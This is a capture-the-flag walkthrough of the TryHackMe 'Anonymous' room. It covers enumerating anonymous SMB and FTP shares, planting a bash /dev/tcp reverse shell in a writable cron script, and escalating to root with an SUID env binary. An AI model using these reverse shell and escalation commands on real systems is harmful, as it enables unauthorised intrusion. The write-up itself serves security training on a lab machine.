---
title: "TryHackMe - Anonymous Walkthrough"
date: 2025-05-25 00:00:00 +0800
categories: [Writeups, TryHackMe]
tags: [tryhackme,medium,ctf,smb,ftp]
image:
  path: https://tryhackme-images.s3.amazonaws.com/room-icons/876a5185c429c9703e625cb48c39637b.png
  alt: Anonymous room logo
---

Room: [Anonymous](https://tryhackme.com/r/room/anonymous)<br>
Author: [Nameless0ne](https://tryhackme.com/r/p/Nameless0ne)<br>
Difficulty: <span style="color: #ef9c03"> **Medium** </span>

## Enumeration

### Port Scan
In this room, the IP for the machine is `10.10.166.189`. We will use `Nmap` to gather information of our target and identify open ports.

```bash
sudo nmap -sSV -T4 -A -Pn 10.10.166.189
```

Nmap scan shows `4` open ports. We also got information about what services and version those ports are and the OS and hostname of the machine. We now have the following information:

```bash
IP: 10.10.166.189
Hostname: anonymous
OS: Ubuntu

Ports:
21 - vsftpd 2.0.8 or later
22 - OpenSSH 7.6p1
139 - Samba smbd 3.X - 4.X
445 - Samba smbd 4.7.6-Ubuntu

Users
namelessone
```

![image.png](/assets/img/thm-anonymous/image.png)

### SMB Enumeration

Since we know that SMB is running on the machine, we can use Nmap to know what are the file shares available on the host.

Resource: <https://nmap.org/nsedoc/scripts/smb-enum-shares.html>

```bash
nmap --script smb-enum-shares.nse -p445 10.10.166.189
```

![image.png](/assets/img/thm-anonymous/image%201.png)

In the Nmap result, we see an interesting fileshare called `pics` . We can also see that `Anonymous` access is allowed for the share.

We can also use `SMBCLIENT` to enumerate file shares.

```bash
smbclient -L \\\\10.10.166.189\\
```

![image.png](/assets/img/thm-anonymous/image%202.png)

We can then access the file share as `Anonymous` using `SMBCLIENT`.

```bash
smbclient \\\\10.10.166.189\\pics -U anonymous --password anonymous
```

![image.png](/assets/img/thm-anonymous/image%203.png)

We have two interesting files, `corgo2.jpg` and `puppos.jpeg`. Unfortunately, there are no interesting information on those files using `exiftool`. Now let’s move on enumerating FTP.

### FTP Enumeration

We know from the Nmap scan that Anonymous access is enabled. Let’s try to access the FTP server.

```bash
ftp anonymous@10.10.166.189
```

Upon accessing the FTP server, we found three interesting files, `clean.sh`, `removed_file.log`, and `to_do.txt`. Also, notice that we have read/write/execute access to the `clean.sh` file.

![image.png](/assets/img/thm-anonymous/image%204.png)

Let’s download those files

```bash
get clean.sh
get removed_files.log
get to_do.txt
```

![image.png](/assets/img/thm-anonymous/image%205.png)

Now let’s check out the contents of those files.

![image.png](/assets/img/thm-anonymous/image%206.png)

![image.png](/assets/img/thm-anonymous/image%207.png)

![image.png](/assets/img/thm-anonymous/image%208.png)

After reviewing the contents of the script file, it seems it is used as a scheduled task to delete the contents of the `/tmp/` directory and if there are no files to delete it will store the message to a log file. 

Remember that we have a write access to the `clean.sh` file. We can take advantage of this to manipulate the file to allow us to run a reverse shell.

We can utilize the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp for the reverse shell payload.) from Internal All The Things by swisskyrepo.

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

Create a netcat listener

```bash
nc -nvlp 8484
```

Modify the `clean.sh` file 

![image.png](/assets/img/thm-anonymous/image%209.png)

Upload `clean.sh` to the target and wait for it to run.  If successful, we should now have a shell.

![image.png](/assets/img/thm-anonymous/image%2010.png)

Nice! we got a shell and a user access.

### User Flag

Now let’s locate the user flag.

![image.png](/assets/img/thm-anonymous/image%2011.png)

<br>

## Privilege Escalation


### Enumeration

Upon doing some PrivEsc path enumeration, we found a way to escalate our access via `SUID`.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Searhcing through [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid), we found out that we can escalate via SUID using `/usr/bin/env`

![image.png](/assets/img/thm-anonymous/image%2012.png)

![image.png](/assets/img/thm-anonymous/image%2013.png)

### Escalation via SUID

We then escalate our privileges using the following command.

```bash
env /bin/sh -p
```

![image.png](/assets/img/thm-anonymous/image%2014.png)

Alright! we are now `root`.

### Root Flag

Now let’s get the root flag.

![image.png](/assets/img/thm-anonymous/image%2015.png)


Thanks for reading my waklthrough, I hope you enjoyed it! 😊

![ThankYouThanksGIF.gif](/assets/img/thm-anonymous/ThankYouThanksGIF.gif)